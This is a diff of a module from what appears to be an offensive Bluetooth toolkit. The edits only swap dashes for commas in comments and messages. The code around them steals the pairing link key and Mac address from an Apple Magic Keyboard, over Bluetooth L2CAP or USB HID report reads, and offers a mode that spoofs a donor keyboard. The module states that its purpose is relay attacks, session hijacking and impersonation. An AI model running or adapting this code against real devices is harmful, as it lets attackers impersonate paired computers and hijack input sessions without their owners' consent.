@@ -6,19 +6,19 @@ distinct paths. The link key + paired-Mac BD_ADDR are stored in HID feature
 reports 0x34 (keyboard identity) and 0x35 (Mac identity + 16-byte LTK).
 
 Once extracted, the link key allows full impersonation of the Mac to the
-keyboard (or vice versa) on a separate adapter — useful for relay attacks,
+keyboard (or vice versa) on a separate adapter, useful for relay attacks,
 session hijacking, and offline analysis of pairing material.
 
 Three modes:
-  bluetooth — Connect L2CAP HID PSM 17 to keyboard, read reports 0x34/0x35
+  bluetooth, Connect L2CAP HID PSM 17 to keyboard, read reports 0x34/0x35
               over the HID Control channel (no USB cable required, but
               keyboard must be in pairing mode or already paired with us)
 
-  usb       — Apple Magic Keyboard plugged in via USB to attacker host.
+  usb      , Apple Magic Keyboard plugged in via USB to attacker host.
               Read reports via USB control transfers (idVendor=0x05ac).
               Yields paired Mac's BD_ADDR + link key without any Bluetooth.
 
-  usb_donor — Use a separate "donor" Magic Keyboard plugged into attacker.
+  usb_donor, Use a separate "donor" Magic Keyboard plugged into attacker.
               Spoof its serial-number string descriptor + report 0x34
               (keyboard BD_ADDR) to match the target keyboard, plug into
               target Mac so the Mac stores its link key in the donor,
@@ -128,14 +128,14 @@ class Module(AuxiliaryModule):
             return False
         if mode == "bluetooth":
             if not PYBLUEZ_AVAILABLE:
-                print_error("pybluez required — run install.sh --classic")
+                print_error("pybluez required, run install.sh --classic")
                 return False
             if not self.validate_bd_addr(self.get_option("keyboard_addr") or ""):
                 print_error("bluetooth mode requires keyboard_addr")
                 return False
         if mode in ("usb", "usb_donor"):
             if not PYUSB_AVAILABLE:
-                print_error("pyusb required — pip install pyusb")
+                print_error("pyusb required, pip install pyusb")
                 return False
         if mode == "usb_donor":
             kb = self.get_option("target_keyboard_addr")
@@ -201,7 +201,7 @@ class Module(AuxiliaryModule):
                 c19.connect((kb_addr, PSM_HID_INTERRUPT))
                 print_success("Connected HID Interrupt (PSM 19)")
             except Exception as e:
-                print_warning(f"HID Interrupt: {e} — proceeding")
+                print_warning(f"HID Interrupt: {e}, proceeding")
 
             # Read HID report 0x34 (keyboard identity)
             res34 = self._read_hid_report_l2cap(c17, 0x34)
@@ -233,7 +233,7 @@ class Module(AuxiliaryModule):
             except Exception: pass
 
     def _read_hid_report_l2cap(self, c17, report_id: int) -> Optional[bytes]:
-        """L2CAP HID Get_Report dance — request, ACK, receive."""
+        """L2CAP HID Get_Report dance, request, ACK, receive."""
         try:
             c17.send(bytes([0x53, 0xFF, report_id]))
             c17.settimeout(1)
@@ -268,12 +268,12 @@ class Module(AuxiliaryModule):
             res_sn = dev.ctrl_transfer(0x80, 0x06, 0x0303, 0x0000, 0x100)
             serial_number = bytes(res_sn[::2][1:]).decode("utf-8", errors="ignore")
 
-            # HID report 0x34 — keyboard identity
+            # HID report 0x34, keyboard identity
             res34 = dev.ctrl_transfer(0xa1, 0x01, 0x0334, 0x0000, 0x100)
             accessory_addr = ":".join(f"{b:02x}" for b in res34[4:10])
             accessory_model = bytes(res34[13:]).decode("utf-8", errors="ignore").strip()
 
-            # HID report 0x35 — Mac identity + link key
+            # HID report 0x35, Mac identity + link key
             res35 = dev.ctrl_transfer(0xa1, 0x01, 0x0335, 0x0000, 0x100)
             mac_addr = ":".join(f"{b:02x}" for b in res35[3:9])
             link_key = binascii.hexlify(bytes(res35[9:25])[::-1]).decode()
@@ -284,7 +284,7 @@ class Module(AuxiliaryModule):
                                link_key, serial_number)
 
             if link_key == NULL_LINK_KEY:
-                print_warning("Link key is all-zeros — keyboard hasn't been paired with a Mac yet")
+                print_warning("Link key is all-zeros, keyboard hasn't been paired with a Mac yet")
                 print_info("Plug into a Mac for ~5s, then back here and re-run")
                 return False
             return True
@@ -389,7 +389,7 @@ class Module(AuxiliaryModule):
         link_key = binascii.hexlify(report[9:25][::-1]).decode()
 
         if link_key == NULL_LINK_KEY:
-            print_warning("Link key is all-zeros — Mac may not have stored it yet")
+            print_warning("Link key is all-zeros, Mac may not have stored it yet")
             print_info("Try plugging into Mac for longer (10s+), or pair manually first")
             return False
 
